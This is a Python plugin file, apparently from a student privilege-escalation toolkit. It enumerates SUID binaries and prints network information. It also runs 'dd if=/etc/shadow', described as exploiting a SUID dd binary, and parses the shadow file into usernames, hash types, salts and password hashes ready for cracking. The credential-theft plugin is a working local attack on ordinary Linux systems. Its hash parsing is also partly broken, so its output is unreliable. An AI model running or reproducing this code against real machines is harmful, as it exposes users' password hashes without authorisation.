#plugins_B.py

from person_B.plugins2 import PrivEsc_B, Enumeration_B, Item
import os
from consolemenu import Screen


class Enumeration_B1(Enumeration_B):
    def __init__(self):
        self.name = "SUID & SGID Enumeration"
        self.author = "Person B"
        self.description = "Finds all files with SUID bit set."
        self.command = "/usr/bin/find / -perm -a=s -perm -4000 ! -type l -exec ls -ld {} \; 2>/dev/null"
        self.file = "temp.txt"
        self.enum_info = Item(self.name, self.author, self.description, self.command)

    def execute(self):
        print (self.enum_info.info())
        Screen().input("Press enter to continue")
        self.suidFiles(self.command)
        Screen().input("Press enter to exit")

    def suidFiles(self, command):
        if command != "":
            os.system(command + " > " + self.file)
            return self.readFile_E1(self.file)

    def readFile_E1(self, file_save):
        if os.path.exists(file_save):
            if os.path.getsize(file_save) > 0:
                with open(file_save, "r") as f:
                    for line in f:
                        parts = line.split()
                        print ("\n", line)

                        if ("s" in f"{parts[0][-6:]}"):
                            print ("\t SUID priviliges found in 'group' and/or 'other' users. Possible escalation.")

                        if ("root" not in parts[3]):
                            print ("\t This files primary group is something other that root. Possible escalation. Check group privileges")

                    os.system(f"rm {file_save}")
            else:
                return f"{self.file} exists but is empty"
        else:
            return f"{self.file} not created"


class Enumeration_B2(Enumeration_B):
    def __init__(self):
        self.name = "Network info"
        self.author = "Person B"
        self.description = "Displays network info of the system. \n"
        self.command = "ifconfig -a"
        self.enum_info = Item(self.name, self.author, self.description, self.command)

    def execute(self):
        print (self.enum_info.info())
        Screen().input("Press enter to continue")
        print (self.networkInfo(self.command))
        Screen().input("Press enter to exit")

    def networkInfo(self, command):
        if command != "":
            return os.system(command)


#class EnumPass(Enumeration_A1):
#    pass


class PrivEsc_B1(PrivEsc_B):
    def __init__(self):
        self.name = "/etc/shadow Privilege Escalation"
        self.author = "Person B"
        self.description = "Uses SUID vulnerability in dd binary to read the /etc/shadow file \n"
        self.command = "dd if=/etc/shadow"
        self.file = "shadow_save.txt"
        self.privesc_info = Item(self.name, self.author, self.description, self.command)

    def execute(self):
        print (self.privesc_info.info())
        Screen().input("Press enter to continue")
        print (self.ddPrivesc(self.command))
        Screen().input("Press enter to exit")

    def ddPrivesc(self, command):
        if command != "" and self.file != '':
            os.system(f"{command} >> {self.file}")
            return self.readFile_P(self.file)

    def readFile_P(self, save_file):
        if os.path.exists(save_file):
            hash_info = []

            with open(save_file, "r") as f:
                for line in f:
                    if "$" in line:
                        parts = line.split("$")

                        for i in parts:
                            part = i.split(":")

                            if len(part) > 1:
                                hash_info.append(part[0])
                            else:
                                hash_info.append(part)

                user = hash_info[0]
                hash_num = hash_info[1][0]
                salt = hash_info[2][0]
                hash_pw = hash_info[3]

                return self.formatInfo(user, hash_num, salt, hash_pw)

    def formatInfo(self, user, hash_num, salt, hash_pw):
        if hash_num == "6":
            hash_type = "SHA-512"
        elif hash_num == "5":
            hash_type = "SHA-256"
        elif hash_num == "2a":
            hash_type = "Blowfish"
        elif hash_num == "1":
            hash_type = "MD5"
        else:
            hash_type = "Unrecognised"

        out = "\n"
        out += f"Username:\n \t{user}\n"
        out += "\n"
        out += f"Hash Type:\n \t{hash_type}\n"
        out += "\n"
        out += f"Hash Salt:\n \t{salt}\n"
        out += "\n"
        out += f"Hash of password:\n \t{hash_pw}\n"
        out += "\n"
        out += f"SAVED TO AND RETIRIEVED FROM {self.file}\n"

        return out
